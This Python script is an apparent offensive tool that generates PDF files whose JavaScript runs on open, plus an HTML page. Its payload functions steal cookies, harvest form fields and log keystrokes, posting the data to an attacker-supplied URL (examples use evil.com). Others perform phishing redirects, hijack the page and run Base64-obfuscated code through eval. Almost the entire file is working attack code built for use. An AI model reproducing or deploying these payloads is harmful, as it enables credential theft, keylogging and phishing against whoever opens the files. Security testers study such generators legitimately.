import argparse
import sys
import os
from datetime import datetime

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

# XSS payload types
XSS_TYPES = {
    'alert': 'Basic alert payload',
    'cookie': 'Cookie stealing payload', 
    'redirect': 'Redirect/phishing payload',
    'form': 'Form data exfiltration payload',
    'dom': 'DOM manipulation payload',
    'obfuscated': 'Obfuscated payload',
    'timer': 'Time-based payload',
    'keylog': 'Keylogger payload',
    'network': 'Network request payload',
    'file': 'File system access payload'
}

def create_pdf_base(filename, payload, description):
    """Base function to create PDF with JavaScript payload"""
    with open(filename, "w") as file:
        file.write(f'''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS ({payload})>> 
        trailer
        <</Root 1 0 R>>''')
        print(f"[+] Created {filename} - {description}")

def create_alert_payload(filename):
    """Basic alert payload"""
    payload = "app.alert('XSS Test - Basic Alert');"
    create_pdf_base(filename, payload, "Basic alert payload")

def create_cookie_payload(filename, url=None):
    """Cookie stealing payload"""
    if url:
        payload = f'''
        try {{
            var cookies = document.cookie;
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "{url}", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("cookies=" + encodeURIComponent(cookies));
            app.alert("Cookies sent to: {url}");
        }} catch(e) {{
            app.alert("Cookie steal attempt: " + cookies);
        }}
        '''
    else:
        payload = "app.alert('Stolen cookies: ' + document.cookie);"
    create_pdf_base(filename, payload, "Cookie stealing payload")

def create_redirect_payload(filename, url=None):
    """Redirect/phishing payload"""
    target_url = url if url else "https://example.com/phishing"
    payload = f'''
    app.alert("You will be redirected to a secure page");
    setTimeout(function() {{
        window.location.href = "{target_url}";
    }}, 2000);
    '''
    create_pdf_base(filename, payload, f"Redirect payload to {target_url}")

def create_form_payload(filename, url=None):
    """Form data exfiltration payload"""
    if url:
        payload = f'''
        try {{
            var formData = "";
            var forms = document.forms;
            for(var i = 0; i < forms.length; i++) {{
                var form = forms[i];
                for(var j = 0; j < form.elements.length; j++) {{
                    var element = form.elements[j];
                    if(element.type !== "submit" && element.type !== "button") {{
                        formData += element.name + "=" + encodeURIComponent(element.value) + "&";
                    }}
                }}
            }}
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "{url}", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("formdata=" + encodeURIComponent(formData));
            app.alert("Form data exfiltrated to {url}");
        }} catch(e) {{
            app.alert("Form exfiltration failed: " + e.message);
        }}
        '''
    else:
        payload = '''
        var formData = "";
        var forms = document.forms;
        for(var i = 0; i < forms.length; i++) {
            var form = forms[i];
            for(var j = 0; j < form.elements.length; j++) {
                var element = form.elements[j];
                if(element.type !== "submit" && element.type !== "button") {
                    formData += element.name + "=" + element.value + "\\n";
                }
            }
        }
        app.alert("Form data captured:\\n" + formData);
        '''
    create_pdf_base(filename, payload, "Form data exfiltration payload")

def create_dom_payload(filename):
    """DOM manipulation payload"""
    payload = '''
    try {
        document.body.style.backgroundColor = "red";
        document.body.innerHTML = "<h1>XSS - DOM Hijacked!</h1><p>This page has been compromised via PDF XSS</p>";
        app.alert("DOM manipulation successful");
    } catch(e) {
        app.alert("DOM manipulation via PDF XSS attempted");
    }
    '''
    create_pdf_base(filename, payload, "DOM manipulation payload")

def create_obfuscated_payload(filename):
    """Obfuscated payload"""
    # Base64 encoded: app.alert("Obfuscated XSS payload executed")
    payload = '''
    var obf = "YXBwLmFsZXJ0KCJPYmZ1c2NhdGVkIFhTUyBwYXlsb2FkIGV4ZWN1dGVkIik=";
    try {
        eval(atob(obf));
    } catch(e) {
        app.alert("Obfuscated payload execution attempted");
    }
    '''
    create_pdf_base(filename, payload, "Obfuscated payload (Base64)")

def create_timer_payload(filename):
    """Time-based payload"""
    payload = '''
    var counter = 0;
    var timer = setInterval(function() {
        counter++;
        app.alert("Time-based XSS execution #" + counter);
        if(counter >= 3) {
            clearInterval(timer);
            app.alert("Time-based payload completed");
        }
    }, 3000);
    '''
    create_pdf_base(filename, payload, "Time-based payload (3 alerts every 3 seconds)")

def create_keylog_payload(filename, url=None):
    """Keylogger payload"""
    if url:
        payload = f'''
        var keylog = "";
        document.addEventListener("keypress", function(e) {{
            keylog += String.fromCharCode(e.which);
            if(keylog.length > 50) {{
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "{url}", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("keylog=" + encodeURIComponent(keylog));
                keylog = "";
            }}
        }});
        app.alert("Keylogger activated - data will be sent to {url}");
        '''
    else:
        payload = '''
        var keylog = "";
        document.addEventListener("keypress", function(e) {
            keylog += String.fromCharCode(e.which);
            if(keylog.length > 20) {
                app.alert("Keylog captured: " + keylog);
                keylog = "";
            }
        });
        app.alert("Keylogger activated - will show captures every 20 characters");
        '''
    create_pdf_base(filename, payload, "Keylogger payload")

def create_network_payload(filename, url=None):
    """Network request payload"""
    target_url = url if url else "https://httpbin.org/get"
    payload = f'''
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "{target_url}", true);
    xhr.onreadystatechange = function() {{
        if (xhr.readyState == 4) {{
            if (xhr.status == 200) {{
                app.alert("Network request successful to {target_url}");
                app.alert("Response: " + xhr.responseText.substring(0, 100) + "...");
            }} else {{
                app.alert("Network request failed. Status: " + xhr.status);
            }}
        }}
    }};
    xhr.send();
    app.alert("Sending network request to {target_url}");
    '''
    create_pdf_base(filename, payload, f"Network request payload to {target_url}")

def create_file_payload(filename):
    """File system access payload"""
    payload = '''
    try {
        var fileReader = new FileReader();
        app.alert("Attempting file system access...");
        
        // Try to access local storage
        if(typeof(Storage) !== "undefined") {
            localStorage.setItem("xss_test", "PDF XSS payload executed at " + new Date());
            app.alert("Local storage access: " + localStorage.getItem("xss_test"));
        }
        
        // Try to access session storage
        if(typeof(Storage) !== "undefined") {
            sessionStorage.setItem("xss_session", "PDF XSS active");
            app.alert("Session storage access successful");
        }
        
    } catch(e) {
        app.alert("File/storage access attempted via PDF XSS: " + e.message);
    }
    '''
    create_pdf_base(filename, payload, "File system/storage access payload")


def create_custom_payload(filename, script):
    """Custom JavaScript payload"""
    create_pdf_base(filename, script, "Custom JavaScript payload")

def create_malhtml(filename):
    """Create malicious HTML file"""
    html_content = '''<!DOCTYPE html>
    <html>
    <head>
        <title>XSS Test</title>
        <script type="text/javascript">
            function showAlerts() {
                alert("XSS Test #1");
                alert("Document cookies: " + document.cookie);
                
                // Additional XSS demonstrations
                setTimeout(function() {
                    alert("Time-delayed XSS payload");
                }, 2000);
                
                // DOM manipulation
                document.body.style.border = "5px solid red";
                
                // Local storage test
                if(typeof(Storage) !== "undefined") {
                    localStorage.setItem("xss_html_test", "HTML XSS executed at " + new Date());
                }
            }
        </script>
    </head>
    <body onload="showAlerts()">
        <h1>XSS Test Page</h1>
        <p>This page demonstrates multiple XSS vectors:</p>
        <ul>
            <li>Basic alert dialogs</li>
            <li>Cookie access</li>
            <li>DOM manipulation</li>
            <li>Time-delayed execution</li>
            <li>Local storage access</li>
        </ul>
        <p style="color: red; font-weight: bold;">If you can see this page, the XSS payload was successful!</p>
    </body>
    </html>'''
    with open(filename, "w") as file:
        file.write(html_content)
    print("[+] Created enhanced HTML XSS test file")

def generate_by_type(xss_type, url=None):
    """Generate PDF based on XSS type"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"xss_{xss_type}_{timestamp}.pdf"
    
    if xss_type == 'alert':
        create_alert_payload(filename)
    elif xss_type == 'cookie':
        create_cookie_payload(filename, url)
    elif xss_type == 'redirect':
        create_redirect_payload(filename, url)
    elif xss_type == 'form':
        create_form_payload(filename, url)
    elif xss_type == 'dom':
        create_dom_payload(filename)
    elif xss_type == 'obfuscated':
        create_obfuscated_payload(filename)
    elif xss_type == 'timer':
        create_timer_payload(filename)
    elif xss_type == 'keylog':
        create_keylog_payload(filename, url)
    elif xss_type == 'network':
        create_network_payload(filename, url)
    elif xss_type == 'file':
        create_file_payload(filename)
    else:
        print(f"Unknown XSS type: {xss_type}")
        return False
    return True

def generate_all_types(url=None):
    """Generate all XSS payload types"""
    print("[+] Generating all XSS payload types...")
    success_count = 0
    
    for xss_type in XSS_TYPES.keys():
        if generate_by_type(xss_type, url):
            success_count += 1
    
    print(f"[+] Successfully generated {success_count} PDF files with different XSS payloads")
    return success_count


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Advanced XSS PDF Generator - Create sophisticated PDF files with various XSS payloads",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
Available XSS Types:
{chr(10).join([f"  {k:12} - {v}" for k, v in XSS_TYPES.items()])}

Examples:
  python3 script.py -o pdf                                    # Generate basic PDF files
  python3 script.py -o pdf -t alert                          # Generate only alert payload
  python3 script.py -o pdf -t cookie -u http://evil.com      # Cookie stealer with URL
  python3 script.py -o pdf -t all -u http://collaborator.com # All payload types
  python3 script.py -s "app.alert('Custom XSS')"            # Custom payload
  python3 script.py -o html                                  # Generate HTML XSS test
        ''')

    parser.add_argument(
        '-u', '--url', action="store", default=None, dest='url',
        help="Specify target URL for data exfiltration (e.g., http://burpsuite12345.com or http://evil.com/collect)")
    
    parser.add_argument(
        '-o', '--output', action="store", default="pdf", dest='output',
        choices=['pdf', 'html'],
        help="Specify output format: pdf (default) or html")
    
    parser.add_argument(
        '-s', '--script', action="store", default=None, dest='script',
        help="Specify custom JavaScript payload (e.g., 'app.alert(1); document.location=\"http://evil.com\"')")
    
    parser.add_argument(
        '-t', '--type', action="store", default=None, dest='xss_type',
        choices=list(XSS_TYPES.keys()) + ['all'],
        help="Specify XSS payload type to generate (use 'all' for all types)")
    
    parser.add_argument(
        '--list-types', action="store_true", 
        help="List all available XSS payload types and exit")

    args = parser.parse_args()

    if args.list_types:
        print("Available XSS Payload Types:")
        print("=" * 50)
        for xss_type, description in XSS_TYPES.items():
            print(f"{xss_type:12} - {description}")
        print("\nUse -t <type> to generate specific payload type")
        print("Use -t all to generate all payload types")
        sys.exit(0)

    output = args.output.lower()
    url = args.url
    script = args.script
    xss_type = args.xss_type

    # Validate URL format if provided
    if url and not (url.startswith('http://') or url.startswith('https://')):
        print(f"Error: Invalid URL format: {url}")
        print("URL must include schema (http:// or https://)")
        sys.exit(1)

    try:
        if output == "pdf":
            if script:
                # Custom script takes precedence
                print("[+] Generating PDF with custom script...")
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"xss_custom_{timestamp}.pdf"
                create_custom_payload(filename, script)
                print("[-] Custom PDF generated successfully!")
                
            elif xss_type:
                # Generate specific type or all types
                if xss_type == 'all':
                    count = generate_all_types(url)
                    print(f"[-] Generated {count} PDF files with all XSS payload types!")
                else:
                    if generate_by_type(xss_type, url):
                        print(f"[-] Generated PDF with {xss_type} XSS payload!")
                    else:
                        print(f"[-] Failed to generate PDF with {xss_type} payload")
                        sys.exit(1)
            else:
                # Default: generate basic payloads (backward compatibility)
                print("[+] Generating basic PDF files (legacy mode)...")
                create_alert_payload("xss_alert_basic.pdf")
                create_cookie_payload("xss_cookie_basic.pdf", url)
                if url:
                    create_network_payload("xss_network_basic.pdf", url)
                print("[-] Basic PDF files generated successfully!")
                print("    Use -t <type> or -t all for more sophisticated payloads")
                
        elif output == "html":
            print("[+] Generating HTML XSS test file...")
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"xss_test_{timestamp}.html"
            create_malhtml(filename)
            print("[-] HTML file generated successfully!")

    except Exception as e:
        print(f"Error: Failed to generate files - {e}")
        sys.exit(1)
